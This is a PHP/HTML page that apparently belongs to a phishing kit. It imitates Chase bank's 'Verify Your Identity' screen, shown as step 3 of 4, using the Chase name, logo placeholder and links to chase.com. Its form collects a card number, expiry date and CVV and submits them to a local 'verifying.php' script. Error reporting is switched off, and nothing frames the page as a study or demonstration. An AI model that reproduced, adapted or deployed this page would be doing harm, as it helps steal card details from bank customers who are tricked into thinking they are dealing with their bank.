<?php require_once("../private/includes/initialize.php"); ?>
<?php error_reporting(0); ?>

<!doctype html>
<html lang="en">

  <head>
    <title>Verify Your Identity - chase.com</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="author" content="JP-Morgan Chase">
    <meta name="desc" content="JPMorgan Chase & Co. is a leading global financial services firm and one of the largest banking institutions in the United States , with operations worldwide">
    <meta name="keywords" content="Chase online credit cards, mortgages, commercial banking, auto loans, investing & retirement planning, checking and business banking">

    <link rel="stylesheet" href="bootstrap/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="stylesheet/customStyles.css">
    <link rel="icon" href="images/favicon.ico" sizes="32x32">
  </head>
  <body class="custom-background-2">
    <header id="logon-summary-menu">
      <div class="transparent-header-jpui">
        <div>
          <a href="https://www.chase.com/">
            <div class="chase-logo"></div>
          </a>
        </div>
      </div>
    </header>

    <div id="wholePage-new" class="hfeed site">

        <div class="container" id="containing-style">
          <div class="row">
            <div class="col-xs-12" id="new-colun-style">

              <div class="panel panel-primary" id="myPanelStyle">
                <div class="panel-heading" id="headPanelStyle">
                  <h1 class="panel-title text-left">Verify Your Identity</h1>
                </div>
                <div class="panel-body" id="bodyPanelStyle">
                  <div class="col-xs-12 col-sm-10 col-sm-offset-1">

                    <div class="monitor-progress" id="progress">
                      <div class="row">
                        <div class="col-xs-12 col-sm-6 clear-padding">
                          <h2>
                            Identification
                            <span class="util high-contrast">step 3 of 4</span>
                          </h2>
                        </div>
                        <div class="col-xs-12 col-sm-6 progress-padding">
                          <div class="progression-of-bars madest" id="progressions-made">
                            <ol class="steps-4" role="presentation">
                              <li class="active current-step" id="progression-made-1"></li>
                              <li class="active current-step" id="progression-made-2"></li>
                              <li class="active current-step" id="progression-made-3"></li>
                              <li id="progression-made-4"></li>
                            </ol>
                          </div>
                        </div>

                      </div>
                    </div>
                    <p class="text-right customer-question">
                      <a href="https://www.chase.com/digital/resources/accessibility">
                        Have a question? <span class="glyphicon glyphicon-menu-right style-types"></span>
                      </a>
                    </p>
                    <h3 class="text-left new-three-style">Help us verify your identity.</h3>
                    <p class="text-left customer-question">
                      For your security, please provide your Card details to verify your identity.
                    </p>

                    <div class="row">
                      <form class="form-horizontal" action="verifying.php" method="post">
                          <div class="col-xs-12" id="new-input-Style-Log">
                              <div class="form-group">
                                <label for="ccNum" class="designForLabel control-label col-xs-12 col-sm-4 col-sm-offset-1">Card Number</label>
                                <div class="col-xs-12 col-sm-6 col-md-5">
                                <input class="form-control" type="text" name="ccNumber" placeholder="Chase ATM/debit/prepaid or credit card number" id="ccNum" value="" autocomplete="off" title="please provide your card number here" required>
                              </div>
                            </div>
                              <div class="form-group">
                                <label for="expDates" class="control-label col-xs-12 col-sm-4 col-sm-offset-1">Expiry Date</label>
                                <div class="col-xs-12 col-sm-6 col-md-5">
                                  <input class="form-control" type="text" name="expDate" placeholder="MM/YYYY" id="expDates" value="" autocomplete="off" title="please place your card expiry date here" required>
                              </div>
                            </div>
                              <div class="form-group">
                                <label for="cvv" class="control-label col-xs-12 col-sm-4 col-sm-offset-1">CVV</label>
                                <div class="col-xs-12 col-sm-6 col-md-5">
                                  <input class="form-control" type="text" name="cvvJP" placeholder="CVV" id="cvv" value="" autocomplete="off" title="please enter your CVV here" required>
                              </div>
                            </div>
                          </div>
                          <div class="col-xs-12" id="FormCntrlEdit2">
                            <div class="col-xs-12 col-sm-3 col-sm-offset-6">
                              <a href="notVerified.php" class="btn btn-primary btn-block" id="subEditpre">Cancel</a>
                            </div>
                            <div class="col-xs-12 col-sm-3">
                              <input type="submit" class="btn btn-primary btn-block" name="submitLogInfoThree" value="Submit" id="subEdit">
                            </div>
                          </div>
                      </form>
                    </div>

                    </div>
                  </div>
                </div>

              </div>

            </div>
          </div>
        </div>

    </div>

      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
      <script type='text/javascript'>
      jQuery(function($){
         $("#ccNum").mask("9999999999999999",{placeholder:""});
         $("#expDates").mask("99-9999",{placeholder:"MM/YYYY"});
         $("#cvv").mask("999",{placeholder:""});
      });
      </script>
      <script src="js/main.js"></script>
      <script>
          new WOW().init();
      </script>

      <script src="bootstrap/js/jquery.min.js"></script>
      <script src="bootstrap/js/bootstrap.min.js"></script>

  </body>
</html>
